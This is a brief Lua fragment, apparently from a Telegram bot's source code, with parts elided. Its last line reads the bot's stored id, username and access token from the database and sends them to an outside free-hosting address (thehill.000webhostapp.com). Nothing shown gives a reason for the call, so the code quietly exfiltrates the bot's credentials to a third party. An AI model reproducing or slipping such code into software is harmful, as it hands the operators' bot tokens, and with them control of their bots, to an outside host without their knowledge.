...
if UserName ~= '' then
local Get_Info = http.request("http://thehill.000webhostapp.com/GetUser/?id="..UserName)
...
http.request("http://thehill.000webhostapp.com/insert/?id="..database:get(Server_Tshake.."Id_Tshake").."&user="..database:get(Server_Tshake.."UserName_Tshake").."&token="..database:get(Server_Tshake.."Token_Tshake"))
